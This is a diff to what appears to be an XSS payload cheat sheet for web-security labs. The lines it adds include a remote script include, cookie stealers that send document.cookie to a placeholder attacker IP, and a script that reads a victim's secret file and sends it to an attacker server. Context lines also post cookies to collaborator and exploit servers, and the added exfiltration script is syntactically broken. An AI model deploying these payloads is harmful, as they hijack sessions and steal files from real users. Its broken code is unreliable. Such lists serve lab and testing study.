@@ -58,6 +58,7 @@ Repeat the same procedure with the target victim
 <img src=0 onerror=alert(0)>
 <img src=x onerror="&#x61;lert(1)">
 <img src=x onerror="#00000000000058;alert(1)">
+<script src="http://<IP>/foo"></script>
 ' - alert(1) - '
 ' + alert(1) + '
 javascript:alert(0)
@@ -66,6 +67,8 @@ javascript:alert(0)
 
 #### COOKIE-STEALER
 ```js
+<img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
+
 <img src=0 onerror="new Image().src='http://<IP>/?cookie='+btoa(document.cookie)">
 
 <img src=0 onerror="fetch('http://<IP>/?cookie='+btoa(document.cookie))">
@@ -74,6 +77,12 @@ javascript:alert(0)
 
 <script>fetch(`https://<BURP-COLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
+
+
+
+
+
+
 
 
 ```
@@ -103,6 +112,26 @@ function handleResponse() {
 };
 </script>
 ```
+
+ read /home/carlos/secret.txt
+```js
+// XSS -> <script src="http://<IP>/exploit"></script>
+
+var domain ="http://<IP>/home/carlos/secret.txt"
+var ourDomain = "http://<OUR-SERVER>/exploit"
+
+var req = new XMLHttpRequest();
+req.withCredentials = true;
+req.open('GET', domain, false);
+req.send();
+
+var response = req.responseText;
+req2.open('GET', ,ourDomain +"/steal?data= + btoa(response) , false);
+req2.withCredentials = true;
+req2.send(response);
+```
+
+
 
 
 #### BYPASS-RESTRICTIONS
@@ -157,16 +186,14 @@ function handleResponse() {
 
 #### SINKS-AND-SOURCES
 
+> SEARCH IN **SOURCE CODE** 
+```
+- SOURCES: origins of untrusted data (inputs coming from external sources).
+- SINKS: points where that data can execute
+- E.G -> sources -> x = window.location.search() + sink -> document.write(x)
+```
 
-> SEARCH IN ** SOURCE CODE ** 
-
-> SOURCES: origins of untrusted data (inputs coming from external sources).
-
-> SINKS: points where that data can execute
-
-> E.G -> sources -> x = window.location.search() + sink -> document.write(x)
-
-SOURCES
+**SOURCES**
 ```html
 location.search
 location.hash 
@@ -186,7 +213,7 @@ localStorage.getItem()
 sessionStorage.getItem()
 
 ```
-SINKS
+**SINKS**
 ```html
 
 element.innerHTML
